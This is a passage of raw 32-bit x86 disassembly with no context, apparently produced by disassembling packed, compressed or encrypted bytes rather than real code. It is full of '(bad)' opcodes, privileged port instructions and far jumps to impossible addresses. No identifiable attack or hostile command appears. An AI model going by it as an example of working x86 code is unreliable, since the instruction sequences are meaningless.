  42319b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42319c:	jne    0x4231fd
  42319e:	push   ecx
  42319f:	lahf   
  4231a0:	(bad)  
  4231a1:	std    
  4231a2:	sub    BYTE PTR [ecx+0x23],dl
  4231a5:	psubd  mm7,QWORD PTR [ebp+0x2a2510b6]
  4231ac:	mov    al,0xdc
  4231ae:	xlat   BYTE PTR ds:[ebx]
  4231af:	scas   al,BYTE PTR es:[edi]
  4231b0:	and    DWORD PTR [ebp-0xd],0x4b
  4231b4:	mov    ch,0x19
  4231b6:	jnp    0x423140
  4231b8:	dec    ecx
  4231b9:	jle    0x4231a4
  4231bb:	les    edx,FWORD PTR [esp+eax*1-0x3533be34]
  4231c2:	sub    BYTE PTR [eax-0x5208e555],cl
  4231c8:	dec    esi
  4231c9:	adc    BYTE PTR [edx+0xb34d288],ch
  4231cf:	mov    BYTE PTR [esi-0x4f181f79],bh
  4231d5:	pusha  
  4231d6:	jge    0x423168
  4231d8:	sbb    BYTE PTR [ebx-0x4aa9e431],al
  4231de:	(bad)  
  4231e1:	xchg   ecx,eax
  4231e2:	dec    ecx
  4231e3:	test   ah,dl
  4231e5:	pop    ss
  4231e6:	inc    di
  4231e8:	dec    esi
  4231e9:	push   cs
  4231ea:	sbb    ebx,DWORD PTR [esi+0x22896d02]
  4231f0:	test   al,0xb6
  4231f2:	sbb    al,0xdc
  4231f4:	mov    ebx,0x39580fbf
  4231f9:	outs   dx,DWORD PTR ds:[esi]
  4231fa:	inc    ebx
  4231fb:	fldenv [edx+esi*4-0x11c05491]
  423202:	sub    eax,0x93fd10eb
  423207:	in     eax,0x84
  423209:	xchg   ecx,eax
  42320a:	ins    BYTE PTR es:[edi],dx
  42320b:	cmp    al,0x25
  42320d:	push   edx
  42320e:	push   es
  42320f:	scas   eax,DWORD PTR es:[edi]
  423210:	add    edi,edi
  423212:	sbb    eax,0xc6e5bf9
  423217:	mov    al,ds:0x6bbd818f
  42321c:	aaa    
  42321d:	xor    bh,BYTE PTR [ebx-0x46c198ed]
  423223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423224:	arpl   WORD PTR ds:0x8c306f4e,bx
  42322b:	push   es
  42322c:	div    BYTE PTR [edi]
  42322e:	jmp    0x998a5fc
  423233:	mov    dl,0x7
  423235:	jns    0x4231e2
  423237:	(bad)  [ecx]
  423239:	push   eax
  42323a:	jo     0x42322b
  42323c:	jl     0x423288
  42323e:	push   ecx
  42323f:	rcr    BYTE PTR [ebx],1
  423241:	ret    0x93a
  423244:	jo     0x42320e
  423246:	dec    eax
  423247:	mov    al,ds:0xd6dbc649
  42324c:	int    0xf9
  42324e:	mov    edi,0xca3e9d21
  423253:	cld    
  423254:	jmp    0x9862f3f7
  423259:	cmp    BYTE PTR [ebp+0x1],cl
  42325c:	push   esp
  42325d:	ret    0x3a56
  423260:	popa   
  423261:	mov    ebx,0x98e67f1a
  423266:	popf   
  423267:	mov    cs,WORD PTR [edi]
  423269:	test   BYTE PTR [edi],al
  42326b:	adc    dl,BYTE PTR [edx+0x61]
  42326e:	xor    DWORD PTR [edx+0x4b2a67df],ecx
  423274:	pushf  
  423275:	and    dl,BYTE PTR [ebp-0xed36ed3]
  42327b:	fcom   DWORD PTR [ecx+ebp*1]
  42327e:	(bad)  
  42327f:	cmp    DWORD PTR [eax],ebx
  423281:	push   ds
  423282:	gs inc eax
  423284:	and    al,0x82
  423286:	and    al,BYTE PTR [edx+0x71100fd1]
  42328c:	jecxz  0x42325d
  42328e:	xlat   BYTE PTR ds:[ebx]
  42328f:	xor    dl,BYTE PTR [edx+0x3175fe0f]
  423295:	xor    DWORD PTR [ecx+0x4e113f7c],0x15
  42329c:	mov    cs,ebp
  42329e:	push   ebx
  42329f:	aam    0xe6
  4232a1:	jge    0x423311
  4232a3:	inc    DWORD PTR [ebx-0x74]
  4232a6:	je     0x42328f
  4232a8:	cwde   
  4232a9:	popa   
  4232aa:	(bad)
  4232ad:	mov    eax,ds:0x6fc5515d
  4232b2:	mov    ebx,0xb99a2141
  4232b7:	lods   al,BYTE PTR ds:[esi]
  4232b8:	jge    0x423312
  4232ba:	push   cs
  4232bb:	test   DWORD PTR [ebp-0x4b],esp
  4232be:	les    eax,FWORD PTR [edi-0x79]
  4232c1:	sub    al,0x69
  4232c3:	or     dh,BYTE PTR [eax+0x75]
  4232c6:	(bad)  
  4232c7:	push   es
  4232c8:	out    0xbd,al
  4232ca:	push   ebp
  4232cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232cc:	(bad)  
  4232cd:	dec    edx
  4232ce:	xchg   ebp,eax
  4232cf:	or     esp,DWORD PTR [edx-0x5a]
  4232d2:	mov    esp,0x7fbe0717
  4232d7:	outs   dx,DWORD PTR ds:[esi]
  4232d8:	add    eax,0xc810cfb0
  4232dd:	int    0xd8
  4232df:	and    edx,esi
  4232e1:	js     0x4232e6
  4232e3:	pop    eax
  4232e4:	push   ds
  4232e5:	shl    BYTE PTR [ebp+0x58],cl
  4232e8:	sbb    esi,edx
  4232ea:	sub    al,0x3
  4232ec:	lock in eax,0x42
  4232ef:	xchg   ebx,eax
  4232f0:	and    al,0xae
  4232f2:	inc    edx
  4232f3:	gs mov al,0xdc
  4232f6:	popa   
  4232f7:	pop    ds
  4232f8:	retf   
  4232f9:	inc    eax
  4232fa:	mov    DWORD PTR [ebx+0x3b],ebx
  4232fd:	pop    eax
  4232fe:	mov    al,bl
  423300:	add    BYTE PTR [eax],al
  423302:	push   edi
  423303:	sub    eax,0xba7f9a07
  423308:	fucomip st,st(5)
  42330a:	ficom  WORD PTR [ebp+0x41]
  42330d:	adc    al,0x7f
  42330f:	mov    cl,0x4a
  423311:	jg     0x423337
  423313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423314:	add    DWORD PTR [eax],eax
  423316:	add    eax,DWORD PTR es:[eax]
  423319:	add    BYTE PTR [edi+eax*4],dh
  42331c:	retf   
  42331d:	sti    
  42331e:	ja     0x423387
  423320:	sbb    esi,ebp
  423322:	jl     0x4232ed
  423324:	imul   ecx,DWORD PTR gs:[ecx+0x3b18dc67],0x5a
  42332c:	add    al,BYTE PTR ds:0x785d0a89
  423332:	(bad)  
  423334:	and    bl,BYTE PTR [ecx+0x1c]
  423337:	pop    esi
  423338:	dec    edi
  423339:	mov    ebx,0xbe0df431
  42333e:	add    DWORD PTR [ebx],edi
  423340:	xchg   BYTE PTR [ecx+0x6ee7a3ec],dl
  423346:	sti    
  423347:	js     0x423310
  423349:	cmp    ch,BYTE PTR [esi]
  42334b:	dec    ebx
  42334c:	call   0xec8c52e1
  423351:	mov    ds:0xd950e98c,eax
  423356:	jb     0x4232f1
  423358:	adc    esi,DWORD PTR [ebx-0x29b2197e]
  42335e:	fiadd  WORD PTR [edx]
  423360:	or     bl,bl
  423362:	and    ch,bl
  423364:	inc    ebp
  423365:	push   eax
  423366:	loope  0x423351
  423368:	and    DWORD PTR [edi-0x5a],edx
  42336b:	fisub  WORD PTR [ebp-0x7955d430]
  423371:	and    eax,0xe9777a54
  423376:	mov    dh,0xf9
  423378:	aas    
  423379:	call   0x4487:0xcaeb33e1
  423380:	(bad)  
  423381:	push   ebp
  423382:	inc    ecx
  423383:	mov    esi,DWORD PTR [esi]
  423385:	inc    ecx
  423386:	(bad)  
  423387:	mov    cl,0x3
  423389:	ins    BYTE PTR es:[edi],dx
  42338a:	sahf   
  42338b:	repnz bound ebx,QWORD PTR [ebp+eiz*1+0x53]
  423390:	je     0x4233e8
  423392:	cmp    al,0x3c
  423394:	adc    edx,ecx
  423396:	aad    0x65
  423398:	(bad)  
  423399:	fmulp  st(4),st
  42339b:	inc    eax
  42339c:	xchg   edx,eax
  42339d:	mov    bl,0x45
  42339f:	ss js  0x42338e
  4233a2:	retf   
  4233a3:	or     DWORD PTR [edx],eax
  4233a5:	pop    ebp
  4233a6:	sub    DWORD PTR ds:0xeae30661,ecx
  4233ac:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4233ae:	nop
  4233af:	lahf   
  4233b0:	sbb    al,0x7a
  4233b2:	pop    ds
  4233b3:	jae    0x4233f3
  4233b5:	ins    BYTE PTR es:[edi],dx
  4233b6:	and    DWORD PTR [edi],edi
  4233b8:	fidiv  WORD PTR [edi-0x3c]
  4233bb:	jle    0x4233e7
  4233bd:	add    DWORD PTR [ebx-0x63e6d877],esi
  4233c3:	xchg   ebp,eax
  4233c4:	daa    
  4233c5:	dec    edi
  4233c6:	(bad)  
  4233c7:	or     al,0x51
  4233c9:	mov    al,0x97
  4233cb:	cdq    
  4233cc:	shr    BYTE PTR [edx],0xf1
  4233cf:	and    eax,0x1e5854db
  4233d4:	inc    eax
  4233d5:	(bad)  
  4233d6:	mov    edx,0x189da3e1
  4233db:	jmp    0xc3ae:0xb7d0aeb1
  4233e2:	arpl   WORD PTR [ebx+0x20997f6c],bx
  4233e8:	les    esi,FWORD PTR [edx-0x39]
  4233eb:	inc    ebx
  4233ec:	arpl   WORD PTR [edx-0x74],cx
  4233ef:	and    bh,cl
  4233f1:	call   0xa945:0x7462c106
  4233f8:	imul   eax,DWORD PTR [eax+eax*8],0x34788199
  4233ff:	scas   al,BYTE PTR es:[edi]
  423400:	inc    esi
  423401:	enter  0x862,0xd2
  423405:	jle    0x4233dc
  423407:	hlt    
  423408:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42340a:	popf   
  42340b:	lds    ebx,FWORD PTR [eax+0x65]
  42340e:	daa    
  42340f:	xor    BYTE PTR [ebp-0x46],ah
  423412:	js     0x4233ab
  423414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423415:	std    
  423416:	(bad)  
  423417:	cmc    
  423418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423419:	sbb    eax,0xb1ca53b6
  42341e:	dec    ebx
  42341f:	mov    dl,0x5f
  423421:	fcmovb st,st(0)
  423423:	dec    ebx
  423424:	loopne 0x423428
  423426:	mov    ecx,0x35bc782c
  42342b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42342c:	icebp  
  42342d:	jne    0x42349c
  42342f:	in     al,dx
  423430:	mov    ds:0x43fd55b0,eax
  423435:	rcl    DWORD PTR [eax+0x161534f5],cl
  42343b:	lds    eax,FWORD PTR [edi]
  42343d:	push   es
  42343e:	repnz sub eax,0x8541ea69
  423444:	jnp    0x4233d0
  423446:	sub    DWORD PTR [ebp-0x5fc41750],edi
  42344c:	(bad)  
  423450:	mov    eax,ds:0xee6c75c9
  423455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423456:	mov    al,ds:0xf74be067
  42345b:	jl     0x4234c5
  42345d:	cmp    DWORD PTR [esi-0x23],ecx
  423460:	mov    esi,0x8a93ab1d
  423465:	dec    esi
  423466:	es jg  0x423475
  423469:	cdq    
  42346a:	mov    edi,0x96555fba
  42346f:	shl    DWORD PTR [ebx],0xa4
  423472:	xchg   esp,eax
  423473:	push   ecx
  423474:	inc    ebx
  423475:	push   esi
  423476:	push   ecx
  423477:	stos   DWORD PTR es:[edi],eax
  423478:	push   ss
  423479:	push   esi
  42347a:	sbb    DWORD PTR [esi+ebp*1+0x8ee529a],esp
  423481:	mov    esp,0xbae9197a
  423486:	cmp    al,0x20
  423488:	inc    ecx
  423489:	out    dx,al
  42348a:	bound  eax,QWORD PTR [edx]
  42348c:	retf   
  42348d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42348e:	mov    ebp,0x84440c6f
  423493:	je     0x4234b5
  423495:	xchg   ebp,eax
  423496:	push   ss
  423497:	jl     0x423461
  423499:	dec    ebp
  42349a:	pop    ds
  42349b:	mov    ds:0x373d7b77,al
  4234a0:	mov    cl,0x5
  4234a2:	scas   eax,DWORD PTR es:[edi]
  4234a3:	fwait
  4234a4:	inc    edx
  4234a5:	dec    edi
  4234a6:	xor    al,0x60
  4234a8:	ja     0x42345b
  4234aa:	push   DWORD PTR [esi-0x51]
  4234ad:	xchg   ebp,eax
  4234ae:	inc    esp
  4234af:	in     al,dx
  4234b0:	ds pop edi
  4234b2:	xor    DWORD PTR [eax],esi
  4234b4:	push   0x1a
  4234b6:	push   esi
  4234b7:	neg    DWORD PTR [edi]
  4234b9:	mov    gs,WORD PTR [eax]
  4234bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234bc:	or     BYTE PTR [esi],bh
  4234be:	push   edi
  4234bf:	aas    
  4234c0:	push   ebp
  4234c1:	jmp    0x462e:0xd47d5a69
  4234c8:	adc    al,0x4a
  4234ca:	out    0x68,eax
  4234cc:	in     eax,0xb0
  4234ce:	fiadd  DWORD PTR [eax-0x22]
  4234d1:	mov    al,0x8d
  4234d3:	call   0xaac1:0x56a23932
  4234da:	inc    ebx
  4234db:	dec    esp
  4234dc:	fstp   DWORD PTR [ebp-0x5]
  4234df:	xor    dl,BYTE PTR [edx-0x48]
  4234e2:	push   esi
  4234e3:	jns    0x4234db
  4234e5:	adc    al,0x64
  4234e7:	ins    BYTE PTR es:[edi],dx
  4234e8:	jl     0x4234e4
  4234ea:	mov    ah,0xc9
  4234ec:	je     0x42354f
  4234ee:	outs   dx,BYTE PTR ds:[esi]
  4234ef:	dec    ecx
  4234f0:	mov    bh,0x63
  4234f2:	and    ebx,esi
  4234f4:	jge    0x4234a5
  4234f6:	pop    edi
  4234f7:	xor    eax,0x75b29532
  4234fc:	fstp   DWORD PTR [eax+ebp*4-0x15]
  423500:	cld    
  423501:	imul   ecx,ebp,0x49
  423504:	test   cl,al
  423506:	data16 daa 
  423508:	mov    edi,0x34955371
  42350d:	mov    ah,0x45
  42350f:	adc    bh,BYTE PTR [esi]
  423511:	shr    esp,0x4a
  423514:	mov    al,0xa8
  423516:	int3   
  423517:	cmp    esi,DWORD PTR [ebx]
  423519:	pop    ds
  42351a:	mov    ds:0xb619c39,al
  42351f:	ss call ebx
  423522:	scas   al,BYTE PTR es:[edi]
  423523:	jg     0x42354c
  423525:	xchg   BYTE PTR ds:0xa349449,bl
  42352b:	ins    DWORD PTR es:[edi],dx
  42352c:	scas   eax,DWORD PTR es:[edi]
  42352d:	sub    DWORD PTR [ebx+0x28],ebp
  423530:	(bad)  
  423531:	push   ebx
  423532:	xlat   BYTE PTR ds:[ebx]
  423533:	mov    DWORD PTR [ecx+0x6bd29298],0x5415089e
  42353d:	je     0x423531
  42353f:	mov    cl,0x48
  423541:	and    eax,0x8be315a8
  423546:	cmp    cl,BYTE PTR [ecx+esi*4-0x262b5ce7]
  42354d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42354e:	sbb    BYTE PTR [eax],al
  423550:	mov    al,ds:0x4a5de52e
  423555:	ret    0x3e72
  423558:	sti    
  423559:	push   esp
  42355a:	loopne 0x4235b3
  42355c:	mov    bl,0xbb
  42355e:	sbb    al,0x5
  423560:	inc    esp
  423561:	dec    esi
  423562:	xor    DWORD PTR [ebx-0x3f],0x5f
  423566:	stos   DWORD PTR es:[edi],eax
  423567:	jno    0x423533
  423569:	cmp    eax,0xd8b8666c
  42356e:	jno    0x4234f2
  423570:	mov    bh,0xd5
  423572:	jo     0x4235e9
  423574:	(bad)  
  423575:	hlt    
  423576:	repnz jecxz 0x423521
  423579:	sbb    al,bl
  42357b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42357d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42357e:	int    0x0
  423580:	mov    bl,BYTE PTR [eax+0x1]
  423583:	add    bh,BYTE PTR [ecx-0x30d28458]
  423589:	(bad)  
  42358a:	cmp    BYTE PTR [edx+0x26],ah
  42358d:	and    al,BYTE PTR [esi-0x47]
  423590:	lds    eax,FWORD PTR [edi+0x4c]
  423593:	cli    
  423594:	jecxz  0x42358b
  423596:	push   esi
  423597:	pusha  
  423598:	cmp    BYTE PTR [ebx+0x60fd3b9d],dl
  42359e:	jp     0x423527
  4235a0:	xchg   dh,cl
  4235a2:	into   
  4235a3:	fld    TBYTE PTR gs:[edi-0x6f]
  4235a7:	shr    ecx,1
  4235a9:	dec    ebp
  4235aa:	jle    0x42354e
  4235ac:	or     ebx,ecx
  4235ae:	dec    edi
  4235af:	imul   eax,DWORD PTR [edx-0x46d439b0],0x936b06b9
  4235b9:	sbb    DWORD PTR [edi+ebp*4+0x1],0xa03c7fae
  4235c1:	in     al,dx
  4235c2:	mov    cl,dl
  4235c4:	jo     0x423617
  4235c6:	push   ss
  4235c7:	scas   al,BYTE PTR es:[edi]
  4235c8:	or     dl,ah
  4235ca:	and    edi,esp
  4235cc:	out    0x33,eax
  4235ce:	popa   
  4235cf:	xor    ecx,DWORD PTR [esp+esi*1]
  4235d2:	in     eax,0x72
  4235d4:	mov    ebx,0x19abede0
  4235d9:	bound  ecx,QWORD PTR [edx-0x5a6288c0]
  4235df:	xchg   ebx,eax
  4235e0:	shl    DWORD PTR [ebx+0x19e07205],1
  4235e6:	mov    bh,ch
  4235e8:	mov    esp,0x99f69218
  4235ed:	pop    esp
  4235ee:	mov    esp,0x2af6a054
  4235f3:	jo     0x4235ce
  4235f5:	out    0x6,eax
  4235f7:	jmp    0x3f6a589
  4235fc:	jnp    0x4235d3
  4235fe:	xor    ch,BYTE PTR [esi]
  423600:	iret   
  423601:	lods   eax,DWORD PTR ds:[si]
  423603:	and    BYTE PTR [eax+0x5d],ch
  423606:	lea    eax,[esi-0x11]
  423609:	cmp    eax,0xfd3d2217
  42360e:	xor    BYTE PTR [ebx-0x10301fe7],bh
  423614:	or     al,0x25
  423616:	or     al,0x3b
  423618:	push   cs
  423619:	pop    edx
  42361a:	add    DWORD PTR [edx-0x728a6012],esp
  423620:	xlat   BYTE PTR ds:[ebx]
  423621:	cmp    eax,0xe2515d9f
  423626:	aas    
  423627:	data16 loopne 0x4235e8
  42362a:	int    0xa6
  42362c:	pusha  
  42362d:	xchg   esi,eax
  42362e:	mov    esp,0x4a11a050
  423633:	and    ah,BYTE PTR [ebx-0x22]
  423636:	or     eax,edx
  423638:	push   es
  423639:	fist   WORD PTR [edi+0x637e28c5]
  42363f:	loop   0x423641
  423641:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  423645:	outs   dx,DWORD PTR es:[esi]
  423647:	daa    
  423648:	ins    DWORD PTR es:[edi],dx
  423649:	push   0xfffffff2
  42364b:	push   esp
  42364c:	stos   DWORD PTR es:[edi],eax
  42364d:	adc    eax,DWORD PTR [esi+ebp*8]
  423650:	jae    0x4236a3
  423652:	dec    edx
  423653:	stos   BYTE PTR es:[edi],al
  423654:	add    DWORD PTR [eax],eax
  423656:	add    eax,DWORD PTR es:[eax]
  423659:	add    BYTE PTR [edx-0x6466b765],dl
  42365f:	xor    DWORD PTR [ecx+ebx*8],0x3c7d0b7a
  423666:	jg     0x4236ad
  423668:	inc    ebp
  423669:	(bad)  
  42366a:	int    0xdb
  42366c:	and    DWORD PTR [ebp-0x25],edi
  42366f:	cmp    bh,BYTE PTR es:[ebx+edi*2-0x54f926b]
  423677:	pop    ebx
  423678:	inc    ecx
  423679:	ror    DWORD PTR [edx+ecx*8],0x2a
  42367d:	mov    dh,0xba
  42367f:	mov    ecx,0x2eb982af
  423684:	pop    ds
  423685:	mov    BYTE PTR [ebp+edx*1-0x65],al
  423689:	retf   
  42368a:	scas   al,BYTE PTR es:[edi]
  42368b:	mov    dh,0x19
  42368d:	lock fnop 
  423690:	int    0x2a
  423692:	in     eax,0x23
  423694:	or     edx,esi
  423696:	es cs or al,0xf6
  42369a:	mov    dl,BYTE PTR [ebx-0x31]
  42369d:	push   ebx
  42369e:	lahf   
  42369f:	pop    esp
  4236a0:	xor    ecx,DWORD PTR [eax]
  4236a2:	mov    esi,0xd7b7806b
  4236a7:	fstp   TBYTE PTR [esi+0x48]
  4236aa:	pop    ds
  4236ab:	dec    edx
  4236ac:	dec    eax
  4236ad:	nop
  4236ae:	add    eax,edx
  4236b0:	je     0x42370e
  4236b2:	(bad)  
  4236b3:	jmp    0x4236d7
  4236b5:	sti    
  4236b6:	jge    0x423652
  4236b8:	push   eax
  4236b9:	adc    eax,0xaa1d0a8e
  4236be:	push   ds
  4236bf:	mov    ebx,0x7b5204f9
  4236c4:	out    0x89,eax
  4236c6:	mov    bh,0xdf
  4236c8:	xor    eax,0xab4dd830
  4236cd:	fnsave [edx]
  4236cf:	repz call 0xa8aeb426
  4236d5:	cmp    DWORD PTR [ebx],ebx
  4236d7:	scas   al,BYTE PTR es:[edi]
  4236d8:	dec    esi
  4236d9:	in     eax,dx
  4236da:	in     eax,0xac
  4236dc:	jns    0x4236f8
  4236de:	mov    esp,0xef05164a
  4236e3:	sbb    BYTE PTR [ecx+edi*2],ch
  4236e6:	sub    al,0x63
  4236e8:	pop    ecx
  4236e9:	mov    bl,0xfd
  4236eb:	mov    eax,DWORD PTR [eax-0x590c8feb]
  4236f1:	rol    ebp,0xc
  4236f4:	xchg   DWORD PTR [esi+0x7fa777d0],esi
  4236fa:	jne    0x42376e
  4236fc:	inc    eax
  4236fd:	ja     0x4236cd
  4236ff:	cmp    ecx,DWORD PTR [ebp-0x38664e46]
  423705:	dec    ecx
  423706:	stos   DWORD PTR es:[edi],eax
  423707:	popf   
  423708:	dec    ebx
  423709:	nop
  42370a:	xchg   DWORD PTR [esi+0x54],esp
  42370d:	mov    cl,0x35
  42370f:	ds mov dh,dl
  423712:	mov    cl,0x98
  423714:	in     eax,dx
  423715:	in     eax,0x6d
  423717:	cmp    DWORD PTR [ebx],ecx
  423719:	loopne 0x4236a4
  42371b:	xor    al,0x8a
  42371d:	mov    bl,0xb
  42371f:	push   ecx
  423720:	push   0x2f91d85c
  423725:	push   eax
  423726:	in     al,dx
  423727:	or     al,0xc4
  423729:	std    
  42372a:	xchg   ebx,eax
  42372b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42372c:	out    0xaf,al
  42372e:	xor    ch,al
  423730:	jno    0x4236c3
  423732:	das    
  423733:	inc    ebx
  423734:	add    al,0x67
  423736:	aas    
  423737:	arpl   bp,bp
  423739:	cmp    eax,0x338a5fd7
  42373e:	jbe    0x4236f2
  423740:	(bad)  
  423742:	jle    0x423711
  423744:	inc    edx
  423745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423746:	loopne 0x4237b4
  423748:	mov    esp,0x19134b67
  42374d:	jmp    0x430c:0x6acc355c
  423754:	dec    esp
  423755:	dec    ecx
  423756:	add    al,0x68
  423758:	sub    BYTE PTR [esi-0x65],cl
  42375b:	adc    bl,0x51
  42375e:	dec    ebx
  42375f:	adc    eax,DWORD PTR ds:0xa36dae83
  423765:	pop    ecx
  423766:	dec    ebp
  423767:	mov    ebp,0xb8229b19
  42376c:	add    bl,dh
  42376e:	popf   
  42376f:	and    esp,DWORD PTR [edx+ebx*4]
  423772:	dec    esp
  423773:	lds    eax,FWORD PTR [ebx+eax*4]
  423776:	jl     0x423776
  423778:	mov    ds:0xeb121065,eax
  42377d:	xor    eax,0x50e005c6
  423782:	mov    ds:0x5d9976ba,al
  423787:	out    0xf3,eax
  423789:	daa    
  42378a:	xchg   esp,eax
  42378b:	adc    eax,0xdf640cad
  423790:	sar    eax,1
  423792:	push   edi
  423793:	mov    bl,0x8e
  423795:	and    cl,BYTE PTR [eax-0x4e]
  423798:	jno    0x423808
  42379a:	sub    DWORD PTR [edi-0x4c],eax
  42379d:	jae    0x423763
  42379f:	(bad)  
  4237a0:	jg     0x423730
  4237a2:	jecxz  0x423771
  4237a4:	xor    BYTE PTR [ebx+0x6e10a253],ah
  4237aa:	pop    edi
  4237ab:	push   cs
  4237ac:	and    DWORD PTR ds:0xa3ce41a8,edi
  4237b2:	mov    ah,BYTE PTR [ecx+ebx*4]
  4237b5:	jbe    0x4237b2
  4237b7:	push   esi
  4237b8:	int3   
  4237b9:	jl     0x4237b2
  4237bb:	call   0xc3c3:0xa2e41fc
  4237c2:	aam    0xbb
  4237c4:	cmp    ecx,DWORD PTR [ebx+0xf]
  4237c7:	popf   
  4237c8:	mov    eax,0xada875cd
  4237cd:	nop
  4237ce:	cmp    al,al
  4237d0:	push   ds
  4237d1:	pushf  
  4237d2:	retf   
  4237d3:	js     0x4237e2
  4237d5:	xchg   ebx,edi
  4237d7:	dec    edx
  4237d8:	fisub  DWORD PTR [ebx]
  4237da:	push   ebp
  4237db:	lods   al,BYTE PTR ds:[esi]
  4237dc:	push   0x6c9fabf2
  4237e1:	loope  0x4237a7
  4237e3:	clc    
  4237e4:	out    0x3a,eax
  4237e6:	(bad)  
  4237e7:	sar    DWORD PTR [ebx+0x44],cl
  4237ea:	repnz push esp
  4237ec:	sbb    al,0x90
  4237ee:	(bad)  
  4237f0:	lock loope 0x4237d5
  4237f3:	sahf   
  4237f4:	popf   
  4237f5:	and    eax,0x19437882
  4237fa:	mov    fs,WORD PTR ds:0xc8f3dbc8
  423800:	test   DWORD PTR [eax],ebx
  423802:	inc    edx
  423803:	ja     0x4237a3
  423805:	outs   dx,DWORD PTR ds:[esi]
  423806:	adc    eax,0xab3e293d
  42380b:	das    
  42380c:	mov    eax,ds:0xe27ec256
  423811:	add    al,0xe0
  423813:	inc    eax
  423814:	mov    ah,0x9c
  423816:	inc    ebx
  423817:	int    0xed
  423819:	retf   0x7dc7
  42381c:	mov    edx,0xd3c9beff
  423821:	mov    cl,BYTE PTR [esi-0x112bad74]
  423827:	pop    esp
  423828:	xchg   edi,eax
  423829:	or     al,0xf2
  42382b:	iret   
  42382c:	clc    
  42382d:	enter  0x158f,0x60
  423831:	and    ebp,DWORD PTR [ebx]
  423833:	sub    BYTE PTR ds:0x7ebb351d,ah
  423839:	sbb    cl,BYTE PTR [ebx]
  42383b:	loopne 0x423834
  42383d:	mov    WORD PTR [ecx-0x5f],?
  423840:	and    eax,0x2b23b961
  423845:	mov    ch,0x7
  423847:	daa    
  423848:	inc    edi
  423849:	nop
  42384a:	xchg   edx,eax
  42384b:	rcl    DWORD PTR [edi-0x5b],cl
  42384e:	pop    edi
  42384f:	outs   dx,BYTE PTR ds:[esi]
  423850:	cmp    eax,0xfd045f2f
  423855:	push   0x6bc6c69a
  42385a:	jmp    0xcc6264dc
  42385f:	xlat   BYTE PTR ds:[ebx]
  423860:	dec    ebx
  423861:	and    BYTE PTR [ebx-0x2b],0xf1
  423865:	es repz cs jae 0x423881
  42386a:	mov    esi,0x5ab3fbe
  42386f:	xor    DWORD PTR [edi+0x6e],ecx
  423872:	imul   ebp,DWORD PTR [edx-0x8be4e74],0x0
  423879:	xchg   BYTE PTR [eax-0x58382b92],cl
  42387f:	(bad)  
  423880:	(bad)  [esi-0x41f76479]
  423886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423887:	fldenv [ebx-0x76]
  42388a:	aas    
  42388b:	in     al,0x3a
  42388d:	xor    eax,0xb4460a6a
  423892:	xlat   BYTE PTR ds:[ebx]
  423893:	(bad)  
  423894:	ins    BYTE PTR es:[edi],dx
  423895:	aad    0xde
  423897:	lds    ebx,FWORD PTR [edx]
  423899:	sbb    eax,0x86f4294
  42389e:	rcr    DWORD PTR [esp+ecx*2-0x69],0x96
  4238a3:	mov    cl,0x54
  4238a5:	xchg   ebp,eax
  4238a6:	xor    eax,0x72f2dd99
  4238ab:	in     eax,dx
  4238ac:	mov    bl,0x61
  4238ae:	out    0x97,eax
  4238b0:	mov    ds:0x6b2781c5,al
  4238b5:	or     eax,0xeb5a12c8
  4238ba:	xchg   edi,eax
  4238bb:	aas    
  4238bc:	jle    0x4238a7
  4238be:	or     al,0x38
  4238c0:	js     0x423867
  4238c2:	mov    dl,0x95
  4238c4:	push   eax
  4238c5:	inc    esi
  4238c6:	xor    esp,DWORD PTR [eax]
  4238c8:	cdq    
  4238c9:	sub    eax,0xed609666
  4238ce:	call   0xc93b:0x1d85d30a
  4238d5:	hlt    
  4238d6:	inc    ebx
  4238d7:	clc    
  4238d8:	xchg   DWORD PTR [eax],edx
  4238da:	imul   esi,edi,0xffffffb2
  4238dd:	loope  0x423892
  4238df:	jmp    0x4c3aa172
  4238e4:	inc    esi
  4238e5:	jb     0x4238ab
  4238e7:	mov    al,ds:0x2ed94733
  4238ec:	stos   DWORD PTR es:[edi],eax
  4238ed:	js     0x423938
  4238ef:	mov    eax,0x71bf0c86
  4238f4:	pop    es
  4238f5:	cmp    edx,esp
  4238f7:	dec    edx
  4238f8:	into   
  4238f9:	cmp    dl,BYTE PTR [ebx+0x41]
  4238fc:	inc    eax
  4238fd:	mov    fs,WORD PTR [edx-0x6db763c5]
  423903:	mov    BYTE PTR [eax-0x7],bl
  423906:	sti    
  423907:	xor    al,BYTE PTR [eax+0x5dedecb0]
  42390d:	fwait
  42390e:	cmp    eax,0x5012ccb6
  423913:	popf   
  423914:	fsubr  QWORD PTR ds:0xaf0d7095
  42391a:	les    esi,FWORD PTR [ecx+0x7dc670cd]
  423920:	stc    
  423921:	mov    esp,eax
  423923:	jne    0x423986
  423925:	or     esi,esp
  423927:	fsub   DWORD PTR [ecx+0x4e9413ef]
  42392d:	xchg   DWORD PTR [ebp-0x7d17ae2f],esp
  423933:	ret    0xebe7
  423936:	nop
  423937:	(bad)  
  423938:	loop   0x4238c8
  42393a:	loope  0x42395b
  42393c:	push   edx
  42393d:	push   ebp
  42393e:	xchg   ebx,eax
  42393f:	sub    eax,0xadfd4342
  423944:	mov    ch,0xd4
  423946:	rcr    BYTE PTR [ecx+edi*2+0x75],0x3a
  42394b:	repnz sub esi,DWORD PTR [ecx+0x7d]
  42394f:	xlat   BYTE PTR ds:[ebx]
  423950:	fld    st(6)
  423952:	push   ss
  423953:	fidivr DWORD PTR [edx]
  423955:	add    al,0xb3
